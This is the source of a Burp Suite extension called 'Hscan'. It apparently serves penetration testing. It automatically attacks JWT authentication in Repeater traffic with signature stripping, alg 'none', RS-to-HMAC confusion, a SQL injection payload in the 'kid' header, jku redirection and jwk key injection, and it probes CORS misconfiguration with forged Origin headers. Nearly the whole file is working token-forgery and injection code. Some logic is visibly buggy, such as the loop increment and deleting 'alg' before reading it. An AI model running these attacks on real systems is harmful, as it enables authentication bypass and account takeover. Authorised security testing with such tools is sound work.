

from burp import IBurpExtender
from burp import IMessageEditorTab
from burp import IMessageEditorTabFactory
import base64
import sys
from burp import IHttpListener
import re
from java.net import URL
from burp import IHttpRequestResponse
import json
import jwt
import subprocess
import re
from config import *
import string

class BurpExtender(IBurpExtender, IHttpListener, IHttpRequestResponse):

    def registerExtenderCallbacks(self, callbacks):

        self._callbacks = callbacks

        self._helpers = callbacks.getHelpers()

        callbacks.setExtensionName("Hscan")

        callbacks.registerHttpListener(self)

        self.banner = '''
        ______  __                           
        ___  / / /__________________ _______ 
        __  /_/ /__  ___/  ___/  __ `/_  __ \
        
        _  __  / _(__  )/ /__ / /_/ /_  / / /
        /_/ /_/  /____/ \___/ \__,_/ /_/ /_/
                    By Anas LAABAB                 
        '''

        self.checked_URL = []
        self.EncryptionAlg = {"RS256":"HMAC256", "RS384": "HMAC384", "RS512": "HMAC512"}
        self.attack_scenarios = ["WIPE", "none", "TOHMAC", "KIDSQLi", "JKU", "JWKH"]
        self.public_key = '''
        -----BEGIN PUBLIC KEY-----
        MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAl02jsZRcv9e0U7gRrhio
        H4ZegmLNmRlu71CB/+eVBwyWuNmOPtMgp6kPqgkxXpJjWh2dSfeTa48pBSlxioSV
        VmExXtAjHr54fYQvolSMiSbyeaZIScKkOBZ8t+6xl/nXlTzI1d+su+tBlHMB3F66
        Dz7eHwd+Hu5bLKhnKS6qkrpMB5oNcLClkpXYuTU23ulEiNw4sBmQ+NUqTPkzJ6Se
        i8XVbV72/e7SGJlYSZcWRQ3QyGMV+GhwIYm0Q0Dlm9pAtOUYoQHBF7aTXv6ZEWR8
        YntjLA0X7PIpHhtHf2OyJ9UBRCdKSteDIlLAorpGgS/PL1CrlhIYfwb4AMPWW4eY
        oQIDAQAB
        -----END PUBLIC KEY-----
        '''
        self._callbacks.printOutput(self.banner)

        return


    def _handle_response_(self, _resp_headers, _pos_, resp_fields):

        _item_found = {}
        if _pos_ != None:
            __msg__ = _resp_headers[_pos_]
        else:
            __msg__ = {header.split(" ")[0].replace(":",""):header.split(" ")[1] for header in _resp_headers if header.split(" ")[0].replace(":","") in resp_fields}

        return __msg__


    def _valid_(self, code):
        if ["200", "202", "201", "204"].__contains__(code):
            return True


    def strip_RM(self, string):
        return string.split(" ")[1]


    def issue_req(self, URL, modified_headers, body):
        message = self._helpers.buildHttpMessage(modified_headers, self._helpers.stringToBytes(body))
        request = self._callbacks.makeHttpRequest(URL.getHost(), 443, True, message)
        response_info = self._helpers.analyzeResponse(request)
        req_hdrs = response_info.getHeaders()
        return [req_hdrs,modified_headers]


    def empty_hdr(self, hdrs):
        
        i = 0
        j = 0
        while i <= (len(hdrs)+j-1):
            del hdrs[0]
            i =+ 1
            j =+ 1

    def HMAC512(self, header, payload, key):
        return jwt.encode(payload, key, algorithm='HS512', headers=header)

    def HMAC256(self, header, payload, key):
        return jwt.encode(payload, key, algorithm='HS256', headers=header)

    def HMAC384(self, header, payload, key):
        return jwt.encode(payload, key, algorithm='HS384', headers=header)

    def checks(self, URL, case, headersx, body):

        Modheaders = []
        Algs = {"RS256":"HMAC256", "RS384": "HMAC384", "RS512": "HMAC512"}

        if case == "WIPE":
            self.empty_hdr(Modheaders)
            for hdr in headersx:
                if "Authorization:" in hdr:
                    Modheaders.append(hdr.replace(hdr.split(" ")[2].split(".")[2], ""))
                else:
                    Modheaders.append(hdr)

            _resp = self.issue_req(URL, Modheaders, body)

            if self._valid_(self._handle_response_(_resp[0], 0, {}).split(" ")[1]):
                self._callbacks.printOutput("ISSUE[JWT|"+case+"], ENDPOINT["+headersx[1].split(" ")[1]+re.sub(r'\?.*','', headersx[0].split(" ")[1])+"], STATUS["+self._handle_response_(_resp[0], 0, {}).split(" ")[1]+"]")
            else:
                self._callbacks.printOutput(self._handle_response_(_resp[0], 0, {}).split(" ")[1])

        elif case == "none":
            self.empty_hdr(Modheaders)
            for hdr in headersx:
                if "Authorization:" in hdr:
                    njwt_hdr = json.loads(base64.b64decode(hdr.split(" ")[2].split(".")[0]+"==="))
                    njwt_hdr["alg"] = "none"
                    Modheaders.append(hdr.split(" ")[0]+" "+hdr.split(" ")[1]+" "+base64.b64encode(json.dumps(njwt_hdr)).replace("=","")+'.'.join(hdr.split(" ")[2].split(".")[:2]))
                else:
                    Modheaders.append(hdr)

            _resp = self.issue_req(URL, Modheaders, body)

            if self._valid_(self._handle_response_(_resp[0], 0, {}).split(" ")[1]):
                self._callbacks.printOutput("ISSUE[JWT|"+case+"], ENDPOINT["+headersx[1].split(" ")[1]+re.sub(r'\?.*','', headersx[0].split(" ")[1])+"], STATUS["+self._handle_response_(_resp[0], 0, {}).split(" ")[1]+"]")
            else:
                self._callbacks.printOutput(self._handle_response_(_resp[0], 0, {}).split(" ")[1])


        elif case == "TOHMAC":
            self.empty_hdr(Modheaders)
            for hdr in headersx:
                if "Authorization:" in hdr:
                    JWT_H = json.loads(base64.b64decode(hdr.split(" ")[2].split(".")[0]+"==="))
                    if JWT_H.__contains__("jwk"):
                        del JWT_H["typ"]
                        del JWT_H["alg"]
                        JWT_P = json.loads(base64.b64decode(hdr.split(" ")[2].split(".")[1]+"==="))
                        for alg in self.EncryptionAlg:
                            if JWT_H["alg"] == alg:
                                njwt_hdr = eval("self."+self.EncryptionAlg[alg]+"({}, {}, '{}')".format(JWT_H, JWT_P, JWT_H["jwk"]))
                                njwt_hdr = hdr.split(" ")[0]+" "+hdr.split(" ")[1]+" "+njwt_hdr
                                Modheaders.append(njwt_hdr)
                                break
                else:
                    Modheaders.append(hdr)

            _resp = self.issue_req(URL, Modheaders, body)

            if self._valid_(self._handle_response_(_resp[0], 0, {}).split(" ")[1]):
                self._callbacks.printOutput("ISSUE[JWT|"+case+"], ENDPOINT["+headersx[1].split(" ")[1]+re.sub(r'\?.*','', headersx[0].split(" ")[1])+"], STATUS["+self._handle_response_(_resp[0], 0, {}).split(" ")[1]+"]")
            else:
                self._callbacks.printOutput(self._handle_response_(_resp[0], 0, {}).split(" ")[1])


        elif case == "KIDSQLi":
            self.empty_hdr(Modheaders)
            for hdr in headersx:
                if "Authorization:" in hdr:
                    JWT_H = json.loads(base64.b64decode(hdr.split(" ")[2].split(".")[0]+"==="))
                    if JWT_H.__contains__("kid"):
                        JWT_H["kid"] = "BULK'/*X*/UNION/*X*/SELECT/*X*/'{}'--".format(self.public_key.replace(" ", "/**/"))
                        del JWT_H["typ"]
                        JWT_P = json.loads(base64.b64decode(hdr.split(" ")[2].split(".")[1]+"==="))
                        for alg in self.EncryptionAlg:
                            if JWT_H["alg"] == alg:
                                del JWT_H["alg"]
                                njwt_hdr = eval("self."+self.EncryptionAlg[alg]+"({}, {}, '{}')".format(JWT_H, JWT_P, "s3cr3t"))
                                njwt_hdr = hdr.split(" ")[0]+" "+hdr.split(" ")[1]+" "+njwt_hdr
                                Modheaders.append(njwt_hdr)
                                break

                else:

                    Modheaders.append(hdr)

            _resp = self.issue_req(URL, Modheaders, body)

            if self._valid_(self._handle_response_(_resp[0], 0, {}).split(" ")[1]):
                self._callbacks.printOutput("ISSUE[JWT|"+case+"], ENDPOINT["+headersx[1].split(" ")[1]+re.sub(r'\?.*','', headersx[0].split(" ")[1])+"], STATUS["+self._handle_response_(_resp[0], 0, {}).split(" ")[1]+"]")
            else:
                self._callbacks.printOutput(self._handle_response_(_resp[0], 0, {}).split(" ")[1])

        elif case == "JKU":
            self.empty_hdr(Modheaders)
            for hdr in headersx:
                if "Authorization:" in hdr:
                    JWT_H = json.loads(base64.b64decode(hdr.split(" ")[2].split(".")[0]+"==="))
                    if JWT_H.__contains__("jku"):
                        JWT_H["jku"] = Key_URL
                        del JWT_H["typ"]
                        JWT_P = json.loads(base64.b64decode(hdr.split(" ")[2].split(".")[1]+"==="))
                        for alg in self.EncryptionAlg:
                            if JWT_H["alg"] == alg:
                                del JWT_H["alg"]
                                njwt_hdr = eval("self."+self.EncryptionAlg[alg]+"({}, {}, '{}')".format(JWT_H, JWT_P, "s3cr3t"))
                                njwt_hdr = hdr.split(" ")[0]+" "+hdr.split(" ")[1]+" "+njwt_hdr
                                Modheaders.append(njwt_hdr)
                                break
                else:
                    Modheaders.append(hdr)

            _resp = self.issue_req(URL, Modheaders, body)

            if self._valid_(self._handle_response_(_resp[0], 0, {}).split(" ")[1]):
                self._callbacks.printOutput("ISSUE[JWT|"+case+"], ENDPOINT["+headersx[1].split(" ")[1]+re.sub(r'\?.*','', headersx[0].split(" ")[1])+"], STATUS["+self._handle_response_(_resp[0], 0, {}).split(" ")[1]+"]")
            else:
                self._callbacks.printOutput(self._handle_response_(_resp[0], 0, {}).split(" ")[1])

        elif case == "JWKH":
            self.empty_hdr(Modheaders)
            for hdr in headersx:
                if "Authorization:" in hdr:
                    JWT_H = json.loads(base64.b64decode(hdr.split(" ")[2].split(".")[0]+"==="))
                    if JWT_H.__contains__("jwk"):
                        JWT_H["jwk"] = "{}".format(self.public_key)
                        del JWT_H["typ"]
                        JWT_P = json.loads(base64.b64decode(hdr.split(" ")[2].split(".")[1]+"==="))
                        for alg in self.EncryptionAlg:
                            if JWT_H["alg"] == alg:
                                del JWT_H["alg"]
                                njwt_hdr = self.RSA_Algorithms(JWT_P, alg, JWT_H)
                                njwt_hdr = hdr.split(" ")[0]+" "+hdr.split(" ")[1]+" "+njwt_hdr
                                Modheaders.append(njwt_hdr)
                                break
                else:
                    Modheaders.append(hdr)

            _resp = self.issue_req(URL, Modheaders, body)

            if self._valid_(self._handle_response_(_resp[0], 0, {}).split(" ")[1]):
                self._callbacks.printOutput("ISSUE[JWT|"+case+"], ENDPOINT["+headersx[1].split(" ")[1]+re.sub(r'\?.*','', headersx[0].split(" ")[1])+"], STATUS["+self._handle_response_(_resp[0], 0, {}).split(" ")[1]+"]")
            else:
                self._callbacks.printOutput(self._handle_response_(_resp[0], 0, {}).split(" ")[1])

    def check_JWT_Token(self, host, headers, body):

        URL_WP = "https://"+host+self.strip_RM(headers[0])
        JAVA_F_URL = URL(URL_WP)
        if "Authorization:" in ' '. join(headers):
            for case in self.attack_scenarios:
                self.checks(JAVA_F_URL, case, headers, body)
                self.checked_URL.append(host)

    def CORS_miscon(self, URL, _req_headers_, payloads, body):
        _fresh_header = []
        init_state = ""
        _pos = None
        for header_field in _req_headers_:
            if "Origin:" in header_field:
                _pos = _req_headers_.index(header_field)
                init_state = header_field
                _fresh_header.append(header_field)
            else:
                _fresh_header.append(header_field)

        if _pos != None:
            for _payload in payloads:

                if re.search("(http)|(https)", _payload):
                    if _fresh_header[_pos].split(" ").__contains__("www"):
                        _fresh_header[_pos] = _fresh_header[_pos].split(" ")[0]+" "+_payload+_fresh_header[_pos].split(" ")[1].replace("https://www", "")
                    else:
                        _fresh_header[_pos] = _fresh_header[_pos].split(" ")[0]+" "+_payload+_fresh_header[_pos].split(" ")[1].replace("https://", "")

                    make_req = self.issue_req(URL, _fresh_header, body)
                    _fresh_header[_pos] = init_state
                    self.parse_CORS_result(make_req, _req_headers_)

                if re.search("\.\w{2,3}$", _payload) and _payload.startswith("."):
                    _fresh_header[_pos] = _fresh_header[_pos].split(" ")[0]+" "+_fresh_header[_pos].split(" ")[1]+_payload
                    make_req = self.issue_req(URL, _fresh_header, body)
                    _fresh_header[_pos] = init_state
                    self.parse_CORS_result(make_req, _req_headers_)

                if re.search("\.\w{2,3}$", _payload) and _payload[0] != ".":
                    Origin = _fresh_header[_pos].split(" ")[1]
                    if re.search("\.\w{3}$", Origin):
                        _fresh_header[_pos] = _fresh_header[_pos].split(" ")[0]+" "+Origin.replace("."+Origin[len(Origin)-3:], _payload.replace("https://",""))
                    else:
                        _fresh_header[_pos] = _fresh_header[_pos].split(" ")[0]+" "+Origin.replace("."+Origin[len(Origin)-2:], _payload.replace("https://",""))

                    make_req = self.issue_req(URL, _fresh_header, body)
                    _fresh_header[_pos] = init_state
                    self.parse_CORS_result(make_req, _req_headers_)

                if _payload.endswith(".") and _payload.count(".") == 1:
                    Origin = _fresh_header[_pos].split(" ")[1]
                    match_wrap = re.search("https\://|http\://", Origin) 
                    Origin = Origin.replace(match_wrap.group(0), "")
                    spl_Origin = Origin.split(".")
                    if len(spl_Origin) == 3:
                        spl_Origin[0] = _payload.replace(".","")
                        _fresh_header[_pos] = _fresh_header[_pos].split(" ")[0]+" "+'.'.join(spl_Origin)
                    else:                    
                        _fresh_header[_pos] = _fresh_header[_pos].split(" ")[0]+" "+_payload+'.'.join(spl_Origin)

                    make_req = self.issue_req(URL, _fresh_header, body)
                    _fresh_header[_pos] = init_state
                    self.parse_CORS_result(make_req, _req_headers_)

            compiled_payloads = [special_char+cases[4] for special_char in string.punctuation]

            for _payload in compiled_payloads:
                _fresh_header[_pos] = _fresh_header[_pos]+_payload
                make_req = self.issue_req(URL, _fresh_header, body)
                _fresh_header[_pos] = _fresh_header[_pos].replace(_payload, "")
                self.parse_CORS_result(make_req, _req_headers_)

    def parse_CORS_result(self, _resp_headers, _req_headers_):

        try:
            allow_origin = self._handle_response_(_resp_headers[0], None, ["Access-Control-Allow-Origin", "Access-Control-Allow-Credentials"])["Access-Control-Allow-Origin"]
        except KeyError:
            allow_origin = None

        try:
            allow_credentials = self._handle_response_(_resp_headers[0], None, ["Access-Control-Allow-Origin", "Access-Control-Allow-Credentials"])["Access-Control-Allow-Credentials"]
        except KeyError:
            allow_credentials = None

        if allow_origin != None and allow_credentials != None:
            self._callbacks.printOutput("ISSUE[CORS], ENDPOINT["+_req_headers_[1].split(" ")[1]+re.sub(r'\?.*','', _req_headers_[0].split(" ")[1])+"], STATUS[]")


    def processHttpMessage(self, toolFlag, messageIsRequest, currentMessage):

        if toolFlag == self._callbacks.TOOL_REPEATER:
            try:
                if messageIsRequest:
                    self.processRequest(currentMessage)
                else:
                    self.processResponse(currentMessage)
            except Exception as e:
                print (e)

    def processResponse(self, currentMessage):
        response = currentMessage.getResponse()
        parsedResponse = self._helpers.analyzeResponse(response)
        self._headers = parsedResponse.getHeaders()
        body = self._helpers.bytesToString(response)[parsedResponse.getBodyOffset():]

    def processRequest(self, currentMessage):
        request = currentMessage.getRequest()
        parsedRequest = self._helpers.analyzeRequest(request)
        body = self._helpers.bytesToString(request)[parsedRequest.getBodyOffset():]
        hrs = parsedRequest.getHeaders()
        for hr in hrs:
            if "Host" in hr:
                Host = hr.replace("Host: ","")
                if hr.replace("Host: ","") not in self.checked_URL:
                    self.check_JWT_Token(Host, hrs, body)
                self.CORS_miscon(URL("https://"+Host+self.strip_RM(hrs[0])), hrs, cases, body)